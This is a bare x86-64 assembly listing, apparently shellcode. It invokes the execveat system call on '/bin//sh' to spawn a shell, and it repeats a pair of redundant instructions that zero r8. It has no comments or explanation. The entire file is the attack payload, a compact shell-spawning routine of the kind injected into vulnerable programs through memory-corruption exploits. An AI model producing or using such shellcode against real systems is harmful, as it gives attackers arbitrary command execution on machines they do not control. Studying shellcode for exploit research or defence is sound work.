global _start
section .text

_start:
push  0x42
pop  rax
inc  ah
cqo
push  rdx
mov  rdi , 0x68732f2f6e69622f
push  rdi
push  rsp
pop  rsi
xor r8, r8
add r8, rdx
xor r8, r8
add r8, rdx
syscall
